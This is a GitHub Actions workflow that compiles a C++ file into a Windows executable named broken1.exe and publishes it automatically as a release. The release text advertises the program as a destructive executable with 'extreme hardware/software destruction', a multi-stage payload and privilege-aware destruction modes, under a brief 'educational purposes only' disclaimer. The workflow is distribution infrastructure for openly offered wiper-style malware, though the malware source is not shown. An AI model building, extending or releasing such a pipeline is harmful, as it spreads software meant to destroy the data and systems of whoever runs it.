name: Build and Release Broken

on:
  push:
    tags:
      - 'v*.*'
  workflow_dispatch:

jobs:
  build-windows:
    runs-on: windows-latest
    strategy:
      matrix:
        arch: [x64]  # Hanya build 64-bit

    steps:
    - name: Setup MSYS2
      uses: msys2/setup-msys2@v2
      with:
        update: true
        install: mingw-w64-x86_64-toolchain

    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Build broken1.exe
      shell: msys2 {0}
      run: |
        export PATH="/mingw64/bin:$PATH"
        g++ --version
        g++ -O2 -Wall -Wextra -static -o broken1.exe \
            BROKEN/broken3.cpp \
            -lwinmm -luser32 -ldwmapi -lgdi32 -lpsapi -lpthread -lshell32 -lcomdlg32 -ladvapi32 \
            -lsetupapi -lvirtdisk -lcrypt32 -lntdll \
            -mwindows -Wno-cast-function-type -Wno-missing-field-initializers

    - name: Verify build
      run: |
        if (-not (Test-Path "broken1.exe")) {
          echo "::error::Build failed!"
          exit 1
        }

    - name: Create GitHub Release
      uses: softprops/action-gh-release@v2
      with:
        tag_name: ${{ github.ref_name }}
        name: Broken ${{ github.ref_name }}
        body: |
          BROKEN DESTRUCTIVE EXECUTABLE
          - Extreme hardware/software destruction
          - Multi-stage destructive payload
          - Privilege-aware destruction modes
          - Built automatically from GitHub Actions
          - Author: WHO-AM-I-404
          
          WARNING: This software is for educational purposes only!
          Do not run on production systems or personal devices.
        files: broken1.exe
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
